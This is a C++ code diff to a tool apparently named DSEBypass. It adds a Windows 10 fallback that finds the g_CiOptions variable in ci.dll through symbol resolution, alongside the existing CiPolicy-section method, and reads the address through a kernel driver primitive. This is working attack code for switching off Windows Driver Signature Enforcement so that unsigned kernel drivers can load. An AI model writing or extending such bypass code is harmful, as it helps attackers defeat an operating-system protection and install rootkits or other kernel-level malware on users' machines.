@@ -843,20 +843,41 @@ std::optional<ULONG_PTR> DSEBypass::GetKernelModuleBase(const char* moduleName) 
 ULONG_PTR DSEBypass::FindCiOptions(ULONG_PTR ciBase) noexcept {
     DEBUG(L"Searching for g_CiOptions in ci.dll at base 0x%llX", ciBase);
     
-    // Get CiPolicy section information
+    ULONG_PTR ciOptionsAddr = 0;
+
+    // Get CiPolicy section information (Fast path - Win11)
     auto dataSection = GetDataSection(ciBase);
-    if (!dataSection) {
-        ERROR(L"Failed to locate CiPolicy section in ci.dll");
-        return 0;
+    if (dataSection) {
+        ULONG_PTR dataStart = dataSection->first;
+        SIZE_T dataSize = dataSection->second;
+        
+        DEBUG(L"CiPolicy section found: 0x%llX (size: 0x%llX)", dataStart, dataSize);
+        
+        // g_CiOptions is always at offset +4 in CiPolicy section
+        ciOptionsAddr = dataStart + 0x4;
+    } else {
+        INFO(L"CiPolicy section not found in ci.dll. Falling back to SymbolEngine (Windows 10)...");
+        
+        // Build path to ci.dll (Windows\System32\ci.dll)
+        wchar_t systemPath[MAX_PATH];
+        if (GetSystemDirectoryW(systemPath, MAX_PATH) == 0) {
+            ERROR(L"Failed to get system directory");
+            return 0;
+        }
+        
+        std::wstring ciPath = std::wstring(systemPath) + L"\\ci.dll";
+        DEBUG(L"Using ci.dll path: %s", ciPath.c_str());
+
+        // Use SymbolEngine to find g_CiOptions offset
+        auto offset = m_symbolEngine.GetSymbolOffset(ciPath, L"g_CiOptions");
+        if (offset) {
+            ciOptionsAddr = ciBase + *offset;
+            SUCCESS(L"Resolved g_CiOptions via SymbolEngine at: 0x%llX (RVA: 0x%llX)", ciOptionsAddr, *offset);
+        } else {
+            ERROR(L"Failed to resolve g_CiOptions via SymbolEngine");
+            return 0;
+        }
     }
-    
-    ULONG_PTR dataStart = dataSection->first;
-    SIZE_T dataSize = dataSection->second;
-    
-    DEBUG(L"CiPolicy section: 0x%llX (size: 0x%llX)", dataStart, dataSize);
-    
-    // g_CiOptions is always at offset +4 in CiPolicy section
-    ULONG_PTR ciOptionsAddr = dataStart + 0x4;
     
     // Verify we can read from this address
     auto currentValue = m_driver->Read32(ciOptionsAddr);
@@ -931,6 +952,6 @@ std::optional<std::pair<ULONG_PTR, SIZE_T>> DSEBypass::GetDataSection(ULONG_PTR 
         }
     }
     
-    ERROR(L"CiPolicy section not found in ci.dll");
+    DEBUG(L"CiPolicy section not found in ci.dll");
     return std::nullopt;
 }
